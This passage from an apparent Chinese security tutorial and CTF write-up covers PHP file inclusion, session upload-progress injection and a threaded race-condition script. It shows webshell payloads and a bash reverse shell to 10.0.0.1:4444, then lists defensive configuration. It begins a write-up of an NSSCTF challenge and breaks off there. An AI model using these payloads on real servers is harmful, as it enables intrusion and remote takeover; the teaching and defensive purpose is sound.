+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># Apache 日志</span><br><span class="line">?file=/var/log/apache2/access.log</span><br><span class="line">?file=/var/log/apache2/error.log</span><br><span class="line"></span><br><span class="line"># Nginx 日志</span><br><span class="line">?file=/var/log/nginx/access.log</span><br><span class="line">?file=/var/log/nginx/error.log</span><br><span class="line"></span><br><span class="line"># 系统日志</span><br><span class="line">?file=/var/log/syslog</span><br><span class="line">?file=/var/log/auth.log</span><br></pre></td></tr></table></figure>
+<p><strong>利用条件</strong>：</p>
+<ul>
+<li>日志文件中包含恶意代码</li>
+<li>代码可通过 User-Agent 等字段注入</li>
+</ul>
+<h4 id="44-php-伪协议利用"><a class="markdownIt-Anchor" href="#44-php-伪协议利用"></a> 4.4 PHP 伪协议利用</h4>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">协议</th>
+<th style="text-align:left">用途</th>
+<th style="text-align:left">条件</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><code>php://filter</code></td>
+<td style="text-align:left">读取文件内容（Base64编码）</td>
+<td style="text-align:left">无特殊限制</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>php://input</code></td>
+<td style="text-align:left">执行POST数据中的PHP代码</td>
+<td style="text-align:left"><code>allow_url_include=On</code></td>
+</tr>
+<tr>
+<td style="text-align:left"><code>data://text/plain</code></td>
+<td style="text-align:left">执行内联PHP代码</td>
+<td style="text-align:left"><code>allow_url_include=On</code></td>
+</tr>
+<tr>
+<td style="text-align:left"><code>zip://</code></td>
+<td style="text-align:left">读取压缩包内的文件</td>
+<td style="text-align:left">需上传zip文件</td>
+</tr>
+</tbody>
+</table>
+<p><strong>示例</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 读取PHP源码（Base64编码）</span><br><span class="line">?file=php://filter/convert.base64-encode/resource=index.php</span><br><span class="line"></span><br><span class="line"># 执行POST数据</span><br><span class="line">?file=php://input</span><br><span class="line">POST: &lt;?php system(&#x27;ls&#x27;); ?&gt;</span><br><span class="line"></span><br><span class="line"># data协议执行代码</span><br><span class="line">?file=data://text/plain,&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="5session-文件包含"><a class="markdownIt-Anchor" href="#5session-文件包含"></a> 5.Session 文件包含</h3>
+<h4 id="51-session-文件基础知识"><a class="markdownIt-Anchor" href="#51-session-文件基础知识"></a> 5.1 Session 文件基础知识</h4>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">配置项</th>
+<th style="text-align:left">典型值</th>
+<th style="text-align:left">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><code>session.save_path</code></td>
+<td style="text-align:left"><code>/tmp</code></td>
+<td style="text-align:left">Session文件存储目录</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>session.name</code></td>
+<td style="text-align:left"><code>PHPSESSID</code></td>
+<td style="text-align:left">Session Cookie名称</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>session.serialize_handler</code></td>
+<td style="text-align:left"><code>php</code></td>
+<td style="text-align:left">序列化处理器</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>session.use_strict_mode</code></td>
+<td style="text-align:left"><code>Off</code></td>
+<td style="text-align:left">是否限制自定义Session ID</td>
+</tr>
+</tbody>
+</table>
+<h4 id="52-session-文件命名规则"><a class="markdownIt-Anchor" href="#52-session-文件命名规则"></a> 5.2 Session 文件命名规则</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">session文件路径 = session.save_path + &#x27;/sess_&#x27; + session_id</span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line">PHPSESSID = abc123</span><br><span class="line">文件路径 = /tmp/sess_abc123</span><br></pre></td></tr></table></figure>
+<h4 id="53-session-文件内容格式"><a class="markdownIt-Anchor" href="#53-session-文件内容格式"></a> 5.3 Session 文件内容格式</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># php_serialize 处理器</span><br><span class="line">恶意代码|a:2:&#123;...&#125;</span><br><span class="line"></span><br><span class="line"># 默认php处理器</span><br><span class="line">恶意代码|a:2:&#123;...&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="54-如何控制-session-内容"><a class="markdownIt-Anchor" href="#54-如何控制-session-内容"></a> 5.4 如何控制 Session 内容</h3>
+<p><strong>方法1：自动初始化（session.auto_start = On）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// PHP自动初始化Session</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;user&#x27;] = $_GET[&#x27;user&#x27;];</span><br><span class="line">// 可写入：?user=&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>方法2：Session Upload Progress</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 上传文件时自动写入Session</span><br><span class="line">POST /upload.php</span><br><span class="line">PHP_SESSION_UPLOAD_PROGRESS = &lt;?php system(&#x27;ls&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="6session-upload-progress-详解"><a class="markdownIt-Anchor" href="#6session-upload-progress-详解"></a> 6.Session Upload Progress 详解</h3>
+<h4 id="61-什么是-session-upload-progress"><a class="markdownIt-Anchor" href="#61-什么是-session-upload-progress"></a> 6.1 什么是 Session Upload Progress？</h4>
+<p>PHP 5.4+ 的特性：上传文件时，如果请求包含特定字段，PHP 自动将上传进度保存到 Session。</p>
+<h4 id="62-触发条件"><a class="markdownIt-Anchor" href="#62-触发条件"></a> 6.2 触发条件</h4>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">条件</th>
+<th style="text-align:left">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><code>session.upload_progress.enabled = On</code></td>
+<td style="text-align:left">启用上传进度（默认开启）</td>
+</tr>
+<tr>
+<td style="text-align:left">POST 请求包含 <code>PHP_SESSION_UPLOAD_PROGRESS</code> 字段</td>
+<td style="text-align:left">触发写入</td>
+</tr>
+<tr>
+<td style="text-align:left">同时上传文件（<code>$_FILES</code>）</td>
+<td style="text-align:left">必须有文件上传</td>
+</tr>
+<tr>
+<td style="text-align:left">Cookie 中包含 <code>PHPSESSID</code></td>
+<td style="text-align:left">指定Session ID</td>
+</tr>
+</tbody>
+</table>
+<h4 id="63-写入过程"><a class="markdownIt-Anchor" href="#63-写入过程"></a> 6.3 写入过程</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.php HTTP/1.1</span><br><span class="line">Cookie: PHPSESSID=c</span><br><span class="line">Content-Type: multipart/form-data; boundary=----boundary</span><br><span class="line"></span><br><span class="line">------boundary</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">&lt;?php system(&#x27;ls&#x27;); ?&gt;</span><br><span class="line">------boundary</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;a.txt&quot;</span><br><span class="line"></span><br><span class="line">AAAAAAAAAAAAAAAAAAA...</span><br><span class="line">------boundary--</span><br></pre></td></tr></table></figure>
+<p>PHP 自动执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 初始化 Session（ID = c）</span><br><span class="line">2. 创建 /tmp/sess_c</span><br><span class="line">3. 写入上传进度信息</span><br><span class="line">4. 信息中包含 PHP_SESSION_UPLOAD_PROGRESS 的值</span><br></pre></td></tr></table></figure>
+<h4 id="64-session-文件内容"><a class="markdownIt-Anchor" href="#64-session-文件内容"></a> 6.4 Session 文件内容</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">upload_progress_&lt;?php system(&#x27;ls&#x27;); ?&gt;|a:5:&#123;</span><br><span class="line">    s:10:&quot;start_time&quot;;i:1234567890;</span><br><span class="line">    s:14:&quot;content_length&quot;;i:1048576;</span><br><span class="line">    s:15:&quot;bytes_processed&quot;;i:1048576;</span><br><span class="line">    s:4:&quot;done&quot;;b:1;</span><br><span class="line">    s:5:&quot;files&quot;;a:1:&#123;...&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="65-自动清理机制"><a class="markdownIt-Anchor" href="#65-自动清理机制"></a> 6.5 自动清理机制</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.upload_progress.cleanup = On（默认）</span><br></pre></td></tr></table></figure>
+<p>上传完成后，PHP 会<strong>立即删除</strong> session 中的上传进度数据。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 清理前</span><br><span class="line">- upload_progress_&lt;?php system(&#x27;ls&#x27;); ?&gt;|a:5:&#123;...&#125;</span><br><span class="line"></span><br><span class="line"># 清理后</span><br><span class="line">+ upload_progress_|a:5:&#123;...&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="7条件竞争race-condition"><a class="markdownIt-Anchor" href="#7条件竞争race-condition"></a> 7.条件竞争（Race Condition）</h3>
+<h4 id="71-为什么需要条件竞争"><a class="markdownIt-Anchor" href="#71-为什么需要条件竞争"></a> 7.1 为什么需要条件竞争</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">上传开始 → 写入恶意代码 → 上传完成 → 立即清理</span><br><span class="line">                        ↑</span><br><span class="line">              恶意代码只存在几毫秒</span><br></pre></td></tr></table></figure>
+<h4 id="72-竞争策略"><a class="markdownIt-Anchor" href="#72-竞争策略"></a> 7.2 竞争策略</h4>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">线程</th>
+<th style="text-align:left">职责</th>
+<th style="text-align:left">操作</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><strong>写入线程</strong></td>
+<td style="text-align:left">创造机会</td>
+<td style="text-align:left">持续上传，不断写入恶意代码</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>读取线程</strong></td>
+<td style="text-align:left">抓住机会</td>
+<td style="text-align:left">持续包含，在清理前执行代码</td>
+</tr>
+</tbody>
+</table>
+<h4 id="73-多线程实现"><a class="markdownIt-Anchor" href="#73-多线程实现"></a> 7.3 多线程实现</h4>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">success = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_thread</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;持续上传，写入恶意代码&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> success:</span><br><span class="line">        requests.post(url, data=payload, files=files, cookies=cookies)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">include_thread</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;持续包含session&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">global</span> success</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> success:</span><br><span class="line">        resp = requests.get(url + <span class="string">&#x27;?file=/tmp/sess_c&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;success_flag&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            success = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动两个线程</span></span><br><span class="line">threading.Thread(target=upload_thread).start()</span><br><span class="line">threading.Thread(target=include_thread).start()</span><br></pre></td></tr></table></figure>
+<h3 id="8lfi-rce远程代码执行"><a class="markdownIt-Anchor" href="#8lfi-rce远程代码执行"></a> 8.LFI -&gt; RCE（远程代码执行）</h3>
+<h4 id="81-攻击链路"><a class="markdownIt-Anchor" href="#81-攻击链路"></a> 8.1 攻击链路</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">LFI → RCE 攻击链                        </span><br><span class="line"></span><br><span class="line">  1. 发现文件包含漏洞                                   </span><br><span class="line">         ↓                                                  </span><br><span class="line">  2. 通过 phpinfo() 获取 Session 配置                        </span><br><span class="line">         ↓                                                  </span><br><span class="line">  3. 利用 Session Upload Progress 写入恶意代码               </span><br><span class="line">         ↓                                                  </span><br><span class="line">  4. 条件竞争包含 Session 文件                               </span><br><span class="line">         ↓                                                  </span><br><span class="line">  5. 执行恶意代码 → 写入 Webshell                            </span><br><span class="line">         ↓                                                  </span><br><span class="line">  6. 通过 Webshell 执行任意命令                              </span><br></pre></td></tr></table></figure>
+<h4 id="82-常用payload"><a class="markdownIt-Anchor" href="#82-常用payload"></a> 8.2 常用Payload</h4>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 写入一句话木马</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/tmp/shell.php&#x27;</span>, <span class="string">&#x27;&lt;?php eval($_POST[cmd]);?&gt;&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行系统命令</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 反弹Shell</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1&quot;&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="9防御措施"><a class="markdownIt-Anchor" href="#9防御措施"></a> 9.防御措施</h3>
+<h4 id="91-代码层面"><a class="markdownIt-Anchor" href="#91-代码层面"></a> 9.1 代码层面</h4>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">防御方式</th>
+<th style="text-align:left">说明</th>
+<th style="text-align:left">示例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><strong>白名单验证</strong></td>
+<td style="text-align:left">只允许指定文件</td>
+<td style="text-align:left"><code>if (in_array($file, $allowed))</code></td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>路径限制</strong></td>
+<td style="text-align:left">限制包含路径</td>
+<td style="text-align:left"><code>realpath()</code> + <code>str_starts_with()</code></td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>禁止动态包含</strong></td>
+<td style="text-align:left">使用常量或配置文件</td>
+<td style="text-align:left"><code>include(APP_PATH . 'header.php')</code></td>
+</tr>
+</tbody>
+</table>
+<h4 id="92-配置层面"><a class="markdownIt-Anchor" href="#92-配置层面"></a> 9.2 配置层面</h4>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 禁用远程包含</span></span><br><span class="line"><span class="attr">allow_url_include</span> = <span class="literal">Off</span></span><br><span class="line"><span class="attr">allow_url_fopen</span> = <span class="literal">Off</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; 限制Session路径</span></span><br><span class="line"><span class="attr">session.save_path</span> = /var/lib/php/sessions</span><br><span class="line"><span class="attr">open_basedir</span> = /var/www/html:/tmp</span><br><span class="line"></span><br><span class="line"><span class="comment">; 关闭Upload Progress</span></span><br><span class="line"><span class="attr">session.upload_progress.enabled</span> = <span class="literal">Off</span></span><br></pre></td></tr></table></figure>
+<h4 id="93-服务器层面"><a class="markdownIt-Anchor" href="#93-服务器层面"></a> 9.3 服务器层面</h4>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Apache - 禁止访问敏感目录</span></span><br><span class="line"><span class="section">&lt;Directory /tmp/&gt;</span></span><br><span class="line">    <span class="attribute">Deny</span> from <span class="literal">all</span></span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="section">&lt;Directory /var/www/uploads/&gt;</span></span><br><span class="line">    <span class="attribute">php_flag</span> engine <span class="literal">off</span></span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nginx - 阻止访问Session文件</span></span><br><span class="line"><span class="section">location</span> <span class="regexp">~ /tmp/</span> &#123;</span><br><span class="line">    <span class="attribute">deny</span> all;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传目录禁止执行PHP</span></span><br><span class="line"><span class="section">location</span> /uploads/ &#123;</span><br><span class="line">    <span class="section">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">        <span class="attribute">deny</span> all;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="10总结"><a class="markdownIt-Anchor" href="#10总结"></a> 10.总结</h3>
+<p>核心知识点:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">文件包含漏洞</span><br><span class="line">    ├── 本地文件包含（LFI）</span><br><span class="line">    │   ├── 读取敏感文件</span><br><span class="line">    │   ├── 目录遍历</span><br><span class="line">    │   ├── 包含日志文件</span><br><span class="line">    │   └── 包含 Session 文件</span><br><span class="line">    ├── 远程文件包含（RFI）</span><br><span class="line">    │   ├── 包含远程恶意文件</span><br><span class="line">    │   └── 需要 allow_url_include = On</span><br><span class="line">    ├── Session Upload Progress</span><br><span class="line">    │   ├── 上传时自动写入 Session</span><br><span class="line">    │   ├── 内容完全可控</span><br><span class="line">    │   └── 上传完成后自动清理</span><br><span class="line">    ├── 条件竞争</span><br><span class="line">    │   ├── 写入线程 + 读取线程</span><br><span class="line">    │   └── 在清理前执行恶意代码</span><br><span class="line">    └── LFI → RCE</span><br><span class="line">        ├── 写入 Webshell</span><br><span class="line">        ├── 执行系统命令</span><br><span class="line">        └── 获取服务器权限</span><br></pre></td></tr></table></figure>
+<h2 id="二-典例分析"><a class="markdownIt-Anchor" href="#二-典例分析"></a> 二、典例分析</h2>
+<h3 id="1第五空间-2021easycleanup"><a class="markdownIt-Anchor" href="#1第五空间-2021easycleanup"></a> 1.[第五空间 2021]EasyCleanup</h3>
+<p>考察内容：文件包含，条件竞争，临时文件</p>
+<p>参考原理理解<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x02-phpinfo">Docker PHP裸文件本地包含综述 | 离别歌</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if(!isset($_GET[&#x27;mode&#x27;]))&#123; </span><br><span class="line">    highlight_file(__file__); </span><br><span class="line">&#125;else if($_GET[&#x27;mode&#x27;] == &quot;eval&quot;)&#123; </span><br><span class="line">    $shell = isset($_GET[&#x27;shell&#x27;]) ? $_GET[&#x27;shell&#x27;] : &#x27;phpinfo();&#x27;; </span><br><span class="line">    if(strlen($shell) &gt; 15 | filter($shell) | checkNums($shell)) exit(&quot;hacker&quot;); </span><br><span class="line">    eval($shell); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123; </span><br><span class="line">    if(strlen($_GET[&#x27;file&#x27;]) &gt; 15 | filter($_GET[&#x27;file&#x27;])) exit(&quot;hacker&quot;); </span><br><span class="line">    include $_GET[&#x27;file&#x27;]; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function filter($var)&#123; </span><br><span class="line">    $banned = [&quot;while&quot;, &quot;for&quot;, &quot;\$_&quot;, &quot;include&quot;, &quot;env&quot;, &quot;require&quot;, &quot;?&quot;, &quot;:&quot;, &quot;^&quot;, &quot;+&quot;, &quot;-&quot;, &quot;%&quot;, &quot;*&quot;, &quot;`&quot;]; </span><br><span class="line"></span><br><span class="line">    foreach($banned as $ban)&#123; </span><br><span class="line">        if(strstr($var, $ban)) return True; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    return False; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">function checkNums($var)&#123; </span><br><span class="line">    $alphanum = &#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;; </span><br><span class="line">    $cnt = 0; </span><br><span class="line">    for($i = 0; $i &lt; strlen($alphanum); $i++)&#123; </span><br><span class="line">        for($j = 0; $j &lt; strlen($var); $j++)&#123; </span><br><span class="line">            if($var[$j] == $alphanum[$i])&#123; </span><br><span class="line">                $cnt += 1; </span><br><span class="line">                if($cnt &gt; 8) return True; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    return False; </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>先对源码进行简单分析：</p>
+<ol>
+<li>默认模式（无参数）</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(!isset($_GET[&#x27;mode&#x27;]))&#123; </span><br><span class="line">    highlight_file(__file__); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>访问时不带<code>mode</code>参数，会高亮显示源码本身。</p>
+<ol start="2">
+<li>Eval执行模式</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">else if($_GET[&#x27;mode&#x27;] == &quot;eval&quot;)&#123; </span><br><span class="line">    $shell = isset($_GET[&#x27;shell&#x27;]) ? $_GET[&#x27;shell&#x27;] : &#x27;phpinfo();&#x27;; </span><br><span class="line">    if(strlen($shell) &gt; 15 | filter($shell) | checkNums($shell)) exit(&quot;hacker&quot;); </span><br><span class="line">    eval($shell); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>接收<code>shell</code>参数作为要执行的PHP代码</li>
+<li>需要满足三个条件才能执行：
+<ul>
+<li>长度 ≤ 15</li>
+<li>通过<code>filter()</code>过滤</li>
+<li>通过<code>checkNums()</code>检查</li>
+</ul>
+</li>
+</ul>
+<ol start="3">
+<li>文件包含模式</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123; </span><br><span class="line">    if(strlen($_GET[&#x27;file&#x27;]) &gt; 15 | filter($_GET[&#x27;file&#x27;])) exit(&quot;hacker&quot;); </span><br><span class="line">    include $_GET[&#x27;file&#x27;]; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>接收<code>file</code>参数进行文件包含</li>
+<li>同样有长度和过滤限制</li>
+</ul>
+<ol start="4">
+<li>过滤函数 <code>filter()</code></li>
+</ol>
+<p>禁止的关键字列表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">while, for, $_GET, $_POST, $_COOKIE, $_SESSION, $_FILES, $_SERVER, </span><br><span class="line">$_ENV, $_REQUEST, include, require, ?, :, ^, +, -, %, *, `</span><br></pre></td></tr></table></figure>
+<p>注意：代码中其实缺了一些常见变量如<code>$_GET</code>、<code>$_POST</code>，但<code>$_</code>被禁止了。</p>
+<ol start="5">
+<li>数字检查函数 <code>checkNums()</code></li>
+</ol>
+<ul>
+<li>统计字符串中字母数字（a-z, A-Z, 0-9）的个数</li>
+<li>如果超过8个字母数字字符，返回True（拒绝执行）</li>
+</ul>
+<p>先试试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:23312/?mode=eval&amp;shell=system(ls);</span><br></pre></td></tr></table></figure>
+<p>返回：LICENSE <a target="_blank" rel="noopener" href="http://README.md">README.md</a> index.php logo.png phpinfo.php</p>
+<p>说明system(ls)执行成功；</p>
+<p>但下一步并不好办，因为对字母数字和整个payload的长度有双重限制，很容易就超过长度限制了，连最简单的cat都会超过限制</p>
+<p>我们试着访问phpinfo.php</p>
+<p>查看session部分：</p>
